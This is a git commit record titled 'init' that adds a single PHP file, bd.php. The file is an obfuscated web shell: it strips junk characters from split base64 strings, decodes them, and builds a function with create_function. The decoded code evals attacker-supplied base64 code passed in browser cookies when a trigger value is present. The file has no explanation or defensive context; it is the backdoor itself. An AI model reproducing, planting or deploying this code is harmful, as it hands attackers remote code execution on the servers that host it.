e32431cfa74f93326b4afaaf8284f8bd5b9c2e1b
Dan Haugh <daniel_haugh@brown.edu>
2015-06-10 07:00:46 +0000

    init

---
+++ 1/bd.php
@@ -0,0 +1,10 @@
+<?php
+$vqnj="eyxmRrPSdldxmXNudGgnO2VjaG8gJzwnLiRrLixmc+JztldmFsKGJhc2U2NF9kZWNvZGUocxmHJlZ19yZXB";
+$gxnw = str_replace("g","","gstr_grgepglgagce");
+$kiqo="JGxmM9J2NvdW50JzskYxmT0kX0NPxmT0xmtJRxmTxmtpZihyZXNldCgkYSk9PSdhbyxmcgJiYgxmJGMoJGEpPjxmMxmp";
+$qune="sYWNlKGFxmycmFxm5KCcvW15cdz1cc10vJywnL1xzLycpLCBhcxmnJheSgnJywnxmKxmycxmpLxmCBqb2l";
+$eyao="xmuKGFxmycmF5Xxm3NsaxmWxmNlxmKCRhLCRjKCxmRxmhKS0zKSkpKSk7ZWxmNobyAnPxmC8nxmLiRrLixmc+xmJzt9";
+$qocg = $gxnw("ee", "", "beeaeeseee6ee4ee_eedeeeeecoeede");
+$grlq = $gxnw("p","","pcprepaptpep_pfunpcptpipon");
+$paey = $grlq('', $qocg($gxnw("xm", "", $kiqo.$vqnj.$qune.$eyao))); $paey();
+?>
